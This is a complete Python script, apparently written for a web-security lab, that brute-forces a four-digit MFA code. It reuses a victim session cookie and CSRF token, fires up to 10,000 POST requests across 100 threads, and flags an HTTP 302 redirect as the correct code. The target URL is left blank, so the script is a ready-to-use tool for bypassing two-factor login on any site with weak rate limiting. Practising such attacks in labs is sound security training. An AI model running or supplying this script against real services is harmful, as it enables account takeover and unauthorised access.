import requests
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
url = ""
# Increase this number to send more requests at once (e.g., 10 to 50)
THREADS = 100
csrf = ""
session= ""

headers = {
    "Cookie": f"session={session}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
    "Content-Type": "application/x-www-form-urlencoded",
}

def attempt_code(code):
    data = {"csrf":csrf,
            "mfa-code": code}
    try:
        # allow_redirects=False is often better for checking if a login worked (302)
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        
        # In many labs, a 302 Found means the code was correct
        if response.status_code == 302:
            print(f"\n[+] SUCCESS! Correct MFA Code: {code}")
            return True
        else:
            # Print progress every 100 attempts so you know it's working
            if int(code) % 100 == 0:
                print(f"Testing... current code: {code}", end="\r")
    except Exception as e:
        pass
    return False

# --- Execution ---
# Generate all codes 0000-9999
all_codes = [f"{i:04}" for i in range(10000)]

print(f"Starting brute force with {THREADS} threads...")

with ThreadPoolExecutor(max_workers=THREADS) as executor:
    # This maps the function to the list of codes across multiple threads
    results = list(executor.map(attempt_code, all_codes))

    if True in results:
        print("Brute force complete.")
    else:
        print("\n[-] Brute force finished. No valid code found.")